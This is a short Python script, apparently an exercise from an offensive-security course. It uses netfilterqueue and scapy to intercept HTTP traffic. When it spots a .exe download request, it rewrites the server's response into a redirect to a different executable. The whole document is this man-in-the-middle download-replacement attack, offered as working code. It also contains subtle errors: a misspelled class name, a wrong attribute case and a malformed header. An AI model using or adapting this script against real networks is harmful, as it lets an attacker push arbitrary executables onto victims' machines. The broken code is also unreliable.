#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

ack_list = []


def process_packet(packet):
    my_packet = scapy.IP(packet.get_payload())
    if my_packet.haslayer(scapy.Raw):
        if my_packet[scapy.TCP].dport == 80:
            ack_list.append(my_packet[scapy.tcp].ack)
            if ".exe" in my_packet[scapy.Raw].load:
                print("[+] .exe Request file requested")
                print(my_packet.show())
        elif my_packet[scapy.TCP].sport == 80:
            if my_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(my_packet[scapy.TCP].seq)
                print("[+] Replacing download file...")
                my_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: " \
                                            "https://www.rarlab.com/rar/winrar-x32-611.exe\n "
                del my_packet[scapy.IP].len
                del my_packet[scapy.IP].chksum
                del my_packet[scapy.TCP].chksum
                packet.set_payload(str(my_packet))

    packet.accept()


queue = netfilterqueue.NetfiletrQueue()
queue.bind(0, process_packet)
queue.run()
